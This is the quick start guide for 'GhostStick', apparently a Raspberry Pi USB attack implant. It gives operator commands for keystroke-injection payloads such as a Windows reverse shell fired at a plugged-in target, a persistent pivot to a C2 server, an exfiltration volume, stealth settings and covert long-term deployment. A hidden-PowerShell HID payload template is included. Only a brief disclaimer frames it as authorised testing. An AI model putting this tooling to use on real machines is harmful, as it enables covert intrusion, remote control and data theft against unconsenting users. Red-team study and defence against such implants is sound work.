# GhostStick Quick Start Guide

## Initial Setup

1. **Flash Raspberry Pi OS Lite**
   - Use Raspberry Pi Imager
   - Enable SSH in settings
   - Configure WiFi for initial access (optional)

2. **Clone and Install**

   ```bash
   git clone https://github.com/Icarus4122/GhostStick
   cd GhostStick
   sudo ./installer.sh
   ```

3. **Reboot**

   ```bash
   sudo reboot
   ```

## First Boot

After reboot, SSH back into the device:

```bash
ssh pi@ghoststick.local
# or use the IP address
```

## Basic Operations

### View System Status

```bash
ghostctl system info
ghostctl diag full
```

### Configure Profile

```bash
# View available profiles
ghostctl profile list

# Set profile (requires reboot)
ghostctl profile set windows
sudo reboot
```

### Setup WiFi

```bash
# Add home network
ghostctl wifi add "MyHomeWiFi" "password123"

# Set WiFi mode
ghostctl wifi set auto   # Auto-connect to saved or open networks
ghostctl wifi set home   # Only connect to saved networks
ghostctl wifi set roam   # Only open networks (stealth roaming)
ghostctl wifi set off    # Disable WiFi

# Apply changes
ghostctl wifi reload
```

### Configure Pivoting

```bash
# Edit pivot configuration
ghostctl pivot config

# In the editor, set:
# PIVOT_ENABLE="true"
# PIVOT_HOST="your-c2-server.com"
# PIVOT_PORT=22
# PIVOT_USER="operator"

# Restart pivot services
ghostctl pivot restart
```

### HID Payloads

```bash
# List available payloads
ghostctl hid list

# Set active payload
ghostctl hid set windows/revshell.txt

# View payload
ghostctl hid edit

# Execute payload (will type keystrokes on host)
ghostctl hid send
```

### Exfiltration Volume

```bash
# Check status
ghostctl exfil status

# Unlock and mount
ghostctl exfil unlock
ghostctl exfil mount

# Access at /opt/ghoststick/exfil
cd /opt/ghoststick/exfil
ls -la

# Unmount and lock
ghostctl exfil unmount
ghostctl exfil lock
```

## Stealth Configuration

### Set Stealth Level

```bash
# View current stealth settings
ghostctl stealth show

# Set stealth level
ghostctl stealth set high   # Maximum stealth
ghostctl stealth set medium # Balanced (default)
ghostctl stealth set low    # Minimal

# Apply hardening
ghostctl stealth apply
```

### Security Hardening

```bash
# View hardening status
ghostctl hardening status

# Edit security configuration
ghostctl hardening config

# Apply hardening
ghostctl hardening apply
```

## Operational Scenarios

### Scenario 1: Quick Windows Engagement

```bash
# Set Windows profile
ghostctl profile set windows
sudo reboot

# After reboot, set HID payload
ghostctl hid set windows/revshell.txt

# Plug into target, then execute
ghostctl hid send
```

### Scenario 2: Long-term Deployment

```bash
# Set secure profile
ghostctl profile set secure

# Enable high stealth
ghostctl stealth set high
ghostctl stealth apply

# Configure persistent pivot
ghostctl pivot enable
ghostctl pivot config
# Set your C2 details

# Setup WiFi roaming
ghostctl wifi set roam
ghostctl wifi reload
```

### Scenario 3: Data Exfiltration

```bash
# Set exfil profile
ghostctl profile set exfil
sudo reboot

# After reboot, mount exfil volume
ghostctl exfil unlock
ghostctl exfil mount

# Access volume appears as USB drive on host
# Copy files to /opt/ghoststick/exfil from device side
```

## Advanced Usage

### Custom HID Payloads

Create custom payload at `/opt/ghoststick/hid/custom/mypayload.txt`:

```text
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -c "your command"
ENTER
```

### Manual Module Execution

```bash
# Re-run specific modules
sudo bash /opt/ghoststick/modules/50-tools-core.sh
sudo bash /opt/ghoststick/modules/60-hid.sh
```

### Diagnostics

```bash
# USB gadget diagnostics
ghostctl diag usb

# Network diagnostics
ghostctl diag network

# Module status
ghostctl diag modules

# View logs
ghostctl system logs
```

## Troubleshooting

### USB not appearing on host

```bash
# Check USB gadget status
ghostctl diag usb

# Verify service is running
sudo systemctl status ghoststick-gadget

# Restart service
sudo systemctl restart ghoststick-gadget
```

### No network connectivity

```bash
# Check interface
ip addr show usb0

# Check DHCP
sudo systemctl status dnsmasq

# Verify iptables
sudo iptables -t nat -L
```

### HID not working

```bash
# Check HID device
ls -la /dev/hidg0

# Check profile
ghostctl profile show

# Verify HID is enabled (not in secure mode)
```

## Safety and Legal

- Always test on systems you own or have authorization to test
- Understand the laws in your jurisdiction
- Use responsibly for security research and testing only

## Factory Seal

When deployment is finalized:

```bash
# Apply irreversible lockdown
ghostctl seal apply
```

This prevents further configuration changes and locks the system.

## Support

For issues, questions, or contributions:

- GitHub: <https://github.com/Icarus4122/GhostStick>
- Review logs: `/opt/ghoststick/install.log`
- Run diagnostics: `ghostctl diag full`
